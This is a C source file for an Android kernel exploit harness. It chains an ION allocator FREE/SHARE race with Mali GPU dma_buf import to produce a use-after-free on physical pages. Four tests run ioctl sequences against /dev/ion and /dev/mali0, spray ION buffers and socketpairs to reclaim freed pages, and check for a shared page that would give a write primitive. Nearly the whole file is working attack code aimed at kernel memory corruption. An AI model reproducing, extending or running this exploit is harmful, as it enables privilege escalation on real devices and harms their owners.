/*
 * mali_exploit14.c — Combined ION race + Mali import UAF
 *
 * CHAIN: ION FREE+SHARE race → dangling dma_buf → Mali import → page UAF
 *
 * The ION FREE+SHARE race (confirmed 100% win rate) can free the ION buffer
 * while a dma_buf fd still references it. If we import this dangling dma_buf
 * into Mali, the GPU region is backed by freed pages.
 *
 * Alternatively: Mali import → ION free → mmap still holds page → spray reclaim
 *
 * Test 1: Import dma_buf, then race ION FREE to free backing pages
 * Test 2: ION race to get dangling dma_buf, then Mali import
 * Test 3: Import + close all refs + check if page is freed/reused
 * Test 4: Import + mmap dma_buf + free ION + close dma_fd + spray
 * Test 5: Write primitive via page reclaim after UAF
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

#define ION_IOC_ALLOC  0xc0144900
#define ION_IOC_FREE   0xc0044901
#define ION_IOC_SHARE  0xc0084904

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16]; memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/* ============================================================= */
/* TEST 1: Import → mmap → free all refs → check page status      */
/* ============================================================= */
static void test1(void) {
    fprintf(stderr, "\n=== TEST 1: Page lifecycle after import+free ===\n");

    int mali_fd = mali_open_ctx();
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (mali_fd < 0 || ion_fd < 0) return;

    /* Allocate ION buffer */
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    ioctl(ion_fd, ION_IOC_ALLOC, &alloc_s);
    int handle = alloc_s.handle;

    /* Share → dma_buf fd */
    struct { int32_t handle, fd; } share_s = {handle, 0};
    ioctl(ion_fd, ION_IOC_SHARE, &share_s);
    int dma_fd = share_s.fd;
    fprintf(stderr, "  ion_fd=%d handle=%d dma_fd=%d\n", ion_fd, handle, dma_fd);

    /* mmap the dma_buf → gives us CPU access to the page */
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (page == MAP_FAILED) { fprintf(stderr, "  mmap failed\n"); return; }
    memset(page, 0x41, 4096);
    fprintf(stderr, "  mmap=%p, wrote 0x41\n", page);

    /* Import into Mali */
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    uint64_t gpu_va = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  Imported: gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* Now systematically release references */

    /* Step 1: Close dma_buf fd */
    close(dma_fd);
    uint8_t v = *(volatile uint8_t *)page;
    fprintf(stderr, "  After close(dma_fd): page[0]=0x%02x\n", v);

    /* Step 2: Free ION handle */
    struct { int32_t handle; } free_s = {handle};
    ioctl(ion_fd, ION_IOC_FREE, &free_s);
    close(ion_fd);
    v = *(volatile uint8_t *)page;
    fprintf(stderr, "  After ION free+close: page[0]=0x%02x\n", v);

    /* Step 3: Free Mali region */
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), fb);
    fprintf(stderr, "  Mali free: result=%u\n", ((struct uk_header*)fb)->id);

    /* Check page again — Mali was the last ref */
    v = *(volatile uint8_t *)page;
    fprintf(stderr, "  After Mali free: page[0]=0x%02x (0x41=still alive)\n", v);

    /* Step 4: Close Mali fd (cleanup) */
    close(mali_fd);
    v = *(volatile uint8_t *)page;
    fprintf(stderr, "  After close(mali_fd): page[0]=0x%02x\n", v);

    /* Write 0x42 to see if page is still writable */
    *(volatile uint8_t *)page = 0x42;
    v = *(volatile uint8_t *)page;
    fprintf(stderr, "  Write+read: 0x%02x\n", v);

    /* Now allocate many ION buffers to see if this page gets reused */
    fprintf(stderr, "\n  Spraying ION buffers to check page reuse...\n");
    int spray_ion = open("/dev/ion", O_RDONLY);
    for (int i = 0; i < 50; i++) {
        struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
            sa = {4096, 4096, 1, 0, 0};
        ioctl(spray_ion, ION_IOC_ALLOC, &sa);
        struct { int32_t handle, fd; } ss = {sa.handle, 0};
        ioctl(spray_ion, ION_IOC_SHARE, &ss);
        void *sp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, ss.fd, 0);
        if (sp != MAP_FAILED) {
            memset(sp, 0xBB, 4096);
            munmap(sp, 4096);
        }
        close(ss.fd);
    }

    v = *(volatile uint8_t *)page;
    fprintf(stderr, "  After 50 ION sprays: page[0]=0x%02x (0xBB=REUSED!)\n", v);
    close(spray_ion);
    munmap(page, 4096);
}

/* ============================================================= */
/* TEST 2: ION race to create dangling dma_buf + Mali import      */
/* ============================================================= */
static volatile int g_race_done = 0;
static volatile int g_race_handle = 0;
static volatile int g_race_ion_fd = 0;

static void *ion_free_thread(void *arg) {
    while (!g_race_done) {
        struct { int32_t handle; } free_s = {g_race_handle};
        ioctl(g_race_ion_fd, ION_IOC_FREE, &free_s);
        usleep(1);
    }
    return NULL;
}

static void test2(void) {
    fprintf(stderr, "\n=== TEST 2: ION race + Mali import ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    int wins = 0;
    for (int trial = 0; trial < 20; trial++) {
        int ion_fd = open("/dev/ion", O_RDONLY);

        /* Alloc */
        struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
            alloc_s = {4096, 4096, 1, 0, 0};
        ioctl(ion_fd, ION_IOC_ALLOC, &alloc_s);

        /* Race: FREE + SHARE simultaneously */
        g_race_ion_fd = ion_fd;
        g_race_handle = alloc_s.handle;
        g_race_done = 0;

        pthread_t free_t;
        pthread_create(&free_t, NULL, ion_free_thread, NULL);

        /* SHARE in main thread */
        usleep(1);
        struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
        int sr = ioctl(ion_fd, ION_IOC_SHARE, &share_s);

        g_race_done = 1;
        pthread_join(free_t, NULL);

        if (sr == 0 && share_s.fd >= 0) {
            /* Got a dma_buf fd — try to import it into Mali */
            int dma_fd = share_s.fd;

            uint8_t buf[48]; memset(buf, 0, 48);
            ((struct uk_header*)buf)->id = 513;
            *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
            *(uint32_t*)(buf + 16) = 2;
            *(uint64_t*)(buf + 24) = 0xF;
            ioctl(mali_fd, make_cmd_vendor(48), buf);
            uint32_t result = ((struct uk_header*)buf)->id;
            uint64_t va = *(uint64_t*)(buf + 32);

            if (result == 0 && va) {
                fprintf(stderr, "  Trial %d: IMPORT OK (va=0x%llx) after race\n",
                        trial, (unsigned long long)va);
                wins++;

                /* Try to mmap the (possibly dangling) dma_buf */
                void *m = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                               MAP_SHARED, dma_fd, 0);
                if (m != MAP_FAILED) {
                    uint8_t v = *(volatile uint8_t *)m;
                    fprintf(stderr, "    mmap OK: page[0]=0x%02x\n", v);
                    munmap(m, 4096);
                }

                /* Free Mali region */
                uint8_t fb[16]; memset(fb, 0, 16);
                ((struct uk_header*)fb)->id = 516;
                *(uint64_t*)(fb + 8) = va;
                ioctl(mali_fd, make_cmd_vendor(16), fb);
            }
            close(dma_fd);
        }
        close(ion_fd);
    }
    fprintf(stderr, "  Total race imports: %d/20\n", wins);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 3: Import + double-close to get dangling Mali region       */
/* close(dma_fd) + close(ion_fd) → buffer freed?                   */
/* Mali import still holds reference?                               */
/* ============================================================= */
static void test3(void) {
    fprintf(stderr, "\n=== TEST 3: Mali region outlives ION buffer ===\n");

    int mali_fd = mali_open_ctx();
    int ion_fd = open("/dev/ion", O_RDONLY);

    /* Alloc + share */
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    ioctl(ion_fd, ION_IOC_ALLOC, &alloc_s);
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    ioctl(ion_fd, ION_IOC_SHARE, &share_s);
    int dma_fd = share_s.fd;

    /* Mali import */
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    uint64_t gpu_va = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  Import: gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* Close dma_buf fd and free ION buffer */
    close(dma_fd);
    struct { int32_t handle; } free_s = {alloc_s.handle};
    ioctl(ion_fd, ION_IOC_FREE, &free_s);
    close(ion_fd);
    fprintf(stderr, "  Closed dma_fd, freed ION handle, closed ION fd\n");

    /* Mali region should still hold reference to dma_buf */
    /* Try operations on the Mali region */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 515;  /* MEM_QUERY */
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  MEM_QUERY after ION free: result=%u\n",
            ((struct uk_header*)buf)->id);

    /* Now free the Mali region — this releases the last dma_buf ref */
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), fb);
    fprintf(stderr, "  Mali free: result=%u\n", ((struct uk_header*)fb)->id);
    fprintf(stderr, "  ← This should have been the last ref, freeing pages!\n");

    /* Now spray to reclaim */
    fprintf(stderr, "  Spraying socketpairs to reclaim freed pages...\n");
    int sv[2];
    int sp_fds[100];
    int sp_count = 0;
    for (int i = 0; i < 50; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
            sp_fds[sp_count++] = sv[0];
            sp_fds[sp_count++] = sv[1];
        }
    }
    fprintf(stderr, "  Created %d socket fds\n", sp_count);

    /* Try to re-import with the freed region's gpu_va */
    /* This tests if the VA was reused */
    int dma2 = -1;
    {
        int i2 = open("/dev/ion", O_RDONLY);
        struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
            a2 = {4096, 4096, 1, 0, 0};
        ioctl(i2, ION_IOC_ALLOC, &a2);
        struct { int32_t handle, fd; } s2 = {a2.handle, 0};
        ioctl(i2, ION_IOC_SHARE, &s2);
        dma2 = s2.fd;

        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma2;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;
        ioctl(mali_fd, make_cmd_vendor(48), buf);
        uint64_t va2 = *(uint64_t*)(buf + 32);
        fprintf(stderr, "  Re-import: va=0x%llx (same=%s)\n",
                (unsigned long long)va2, va2 == gpu_va ? "YES" : "NO");
        close(dma2);
        close(i2);
    }

    for (int i = 0; i < sp_count; i++) close(sp_fds[i]);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 4: Verify mmap persistence — the real UAF test             */
/* mmap dma_buf → close all fd refs → Mali import holds page →    */
/* Mali free → page freed → mmap is dangling → spray             */
/* ============================================================= */
static void test4(void) {
    fprintf(stderr, "\n=== TEST 4: Dangling mmap via Mali import lifecycle ===\n");

    int mali_fd = mali_open_ctx();
    int ion_fd = open("/dev/ion", O_RDONLY);

    /* Alloc + share */
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    ioctl(ion_fd, ION_IOC_ALLOC, &alloc_s);
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    ioctl(ion_fd, ION_IOC_SHARE, &share_s);
    int dma_fd = share_s.fd;

    /* mmap the dma_buf */
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (page == MAP_FAILED) { fprintf(stderr, "  mmap failed\n"); return; }
    memset(page, 0xAA, 4096);
    fprintf(stderr, "  mmap=%p (pattern 0xAA)\n", page);

    /* Import */
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    uint64_t gpu_va = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  Import: gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* Release all fd-level references */
    close(dma_fd);
    struct { int32_t handle; } free_s = {alloc_s.handle};
    ioctl(ion_fd, ION_IOC_FREE, &free_s);
    close(ion_fd);
    fprintf(stderr, "  All fd/handle refs closed\n");

    /* Page should still be accessible via mmap (VMA ref) */
    uint8_t v = *(volatile uint8_t *)page;
    fprintf(stderr, "  mmap read: 0x%02x (0xAA=alive)\n", v);

    /* Mali free — releases dma_buf ref in driver */
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), fb);
    fprintf(stderr, "  Mali free: result=%u\n", ((struct uk_header*)fb)->id);

    /* Now: all refs EXCEPT our mmap VMA should be gone */
    /* The mmap VMA holds a reference through vm_operations */
    /* On ION, the VMA's close callback releases the last ref */
    v = *(volatile uint8_t *)page;
    fprintf(stderr, "  After mali free: 0x%02x\n", v);

    /* Write pattern to our "last reference" page */
    memset(page, 0xCC, 4096);

    /* Allocate many new ION buffers — if our page is freed, one of these
     * might get the same physical page */
    fprintf(stderr, "  Allocating 100 ION buffers to reclaim pages...\n");
    void *spray_pages[100];
    int spray_fds[100];
    int spray_count = 0;
    int spray_ion = open("/dev/ion", O_RDONLY);
    for (int i = 0; i < 100; i++) {
        struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
            sa = {4096, 4096, 1, 0, 0};
        if (ioctl(spray_ion, ION_IOC_ALLOC, &sa) < 0) break;
        struct { int32_t handle, fd; } ss = {sa.handle, 0};
        if (ioctl(spray_ion, ION_IOC_SHARE, &ss) < 0) break;
        spray_fds[spray_count] = ss.fd;
        spray_pages[spray_count] = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                                         MAP_SHARED, ss.fd, 0);
        if (spray_pages[spray_count] != MAP_FAILED) {
            memset(spray_pages[spray_count], 0xDD, 4096);
            spray_count++;
        }
    }
    fprintf(stderr, "  Sprayed %d pages (pattern 0xDD)\n", spray_count);

    /* Check if our original page was overwritten */
    v = *(volatile uint8_t *)page;
    fprintf(stderr, "  Original page: 0x%02x (0xCC=ours, 0xDD=RECLAIMED!)\n", v);

    if (v == 0xDD) {
        fprintf(stderr, "  *** PAGE RECLAIM CONFIRMED — UAF! ***\n");
        /* Find which spray page shares our physical page */
        for (int i = 0; i < spray_count; i++) {
            /* Write unique marker to spray page */
            *(volatile uint8_t *)spray_pages[i] = (uint8_t)(0xE0 | (i & 0xF));
            uint8_t ov = *(volatile uint8_t *)page;
            if (ov == (uint8_t)(0xE0 | (i & 0xF))) {
                fprintf(stderr, "  *** SHARED PAGE: spray[%d] at %p! ***\n",
                        i, spray_pages[i]);
                fprintf(stderr, "  Writes to spray[%d] are visible via original mmap!\n", i);
                break;
            }
            /* Restore */
            *(volatile uint8_t *)spray_pages[i] = 0xDD;
        }
    }

    /* Cleanup */
    for (int i = 0; i < spray_count; i++) {
        munmap(spray_pages[i], 4096);
        close(spray_fds[i]);
    }
    close(spray_ion);
    munmap(page, 4096);
    close(mali_fd);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== ION Race + Mali Import UAF ===\n");
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    if (test == 1 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(30); test1(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }
    if (test == 2 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(30); test2(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }
    if (test == 3 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(30); test3(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }
    if (test == 4 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(30); test4(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
